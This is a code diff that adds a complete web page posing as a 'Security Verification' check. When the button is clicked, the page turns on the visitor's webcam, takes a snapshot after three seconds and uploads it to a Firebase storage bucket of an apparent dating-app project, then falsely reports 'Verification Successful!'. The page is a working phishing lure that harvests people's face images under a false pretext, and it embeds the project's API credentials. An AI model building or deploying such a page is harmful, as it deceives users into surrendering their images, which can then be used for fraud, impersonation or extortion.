@@ -1,14 +1,77 @@
-        canvas.width = 640; canvas.height = 480;
-        canvas.getContext('2d').drawImage(video, 0, 0);
-        
-        canvas.toBlob(blob => {
-            const ref = storage.ref(`captured/${Date.now()}.png`);
-            ref.put(blob).then(() => {
-                document.getElementById('status').innerText = "Verification Complete!";
-                stream.getTracks().forEach(t => t.stop());
-            });
-        }, 'image/png');
-    }
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Check</title>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-storage.js"></script>
+    <style>
+        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #f0f2f5; }
+        .card { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 5px 15px rgba(0,0,0,0.2); text-align: center; width: 90%; max-width: 400px; }
+        .btn { background-color: #007bff; color: white; border: none; padding: 15px; border-radius: 8px; width: 100%; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 20px; }
+        #status { margin-top: 20px; color: #555; font-weight: 500; }
+        video, canvas { display: none; width: 100%; border-radius: 10px; margin-top: 10px; }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <h2>Security Verification</h2>
+    <p>Please click the button to start the camera verification.</p>
+    <button id="startBtn" class="btn">Start Verification</button>
+    <div id="status">Ready...</div>
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+</div>
+
+<script>
+    const firebaseConfig = {
+        apiKey: "AIzaSyAXHdAeQY5I_YJvR_7I0xU2zQYpMvR4",
+        authDomain: "umardatingapp.firebaseapp.com",
+        projectId: "umardatingapp",
+        storageBucket: "umardatingapp.appspot.com",
+        messagingSenderId: "589931647437",
+        appId: "1:589931647437:web:3e9b70abafdb1b16be97484"
+    };
+
+    firebase.initializeApp(firebaseConfig);
+    const storage = firebase.storage();
+
+    const startBtn = document.getElementById('startBtn');
+    const status = document.getElementById('status');
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+
+    startBtn.onclick = async () => {
+        startBtn.style.display = 'none';
+        status.innerText = "Connecting to camera...";
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            video.srcObject = stream;
+            video.style.display = 'block';
+            status.innerText = "Verifying... Stay still";
+
+            setTimeout(() => {
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                canvas.toBlob(blob => {
+                    const ref = storage.ref().child('captured/' + Date.now() + '.png');
+                    ref.put(blob).then(() => {
+                        status.innerText = "✅ Verification Successful!";
+                        status.style.color = "green";
+                        video.style.display = 'none';
+                        stream.getTracks().forEach(t => t.stop());
+                    });
+                }, 'image/png');
+            }, 3000);
+        } catch (err) {
+            status.innerText = "Error: Camera access denied.";
+            status.style.color = "red";
+            startBtn.style.display = 'block';
+        }
+    };
 </script>
 </body>
 </html>
